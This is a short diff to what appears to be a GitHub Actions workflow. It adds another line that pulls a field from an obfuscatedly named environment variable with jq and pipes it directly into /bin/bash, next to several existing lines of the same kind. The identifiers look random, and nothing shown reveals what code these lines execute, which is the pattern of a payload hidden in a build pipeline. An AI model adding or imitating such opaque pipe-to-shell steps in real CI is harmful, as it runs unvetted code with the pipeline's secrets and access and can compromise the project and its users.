@@ -34,6 +34,7 @@ jobs:
           echo $puom16 | jq -r .as18375 | /bin/bash
           printf '%s' "$rriz656" | jq -r .qe5 | /bin/bash
           printf '%s' "$b6" | jq -r .hlzu07584 | /bin/bash
+          printf '%s' "$t0" | jq -r .tji5522 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
